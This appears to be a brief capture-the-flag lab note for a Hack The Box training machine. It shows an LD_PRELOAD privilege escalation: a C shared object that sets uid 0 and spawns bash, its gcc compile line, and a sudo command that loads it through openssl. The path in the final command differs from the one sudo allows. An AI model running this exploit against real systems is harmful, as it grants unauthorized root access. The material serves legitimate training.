# IP 
> 10.129.2.210

# CMD Use :
> sudo -l
    User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl

> nano root.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }

> gcc -fPIC -shared -o root.so root.c -nostartfiles

> sudo LD_PRELOAD=/tmp/root.so /usr/sbin/openssl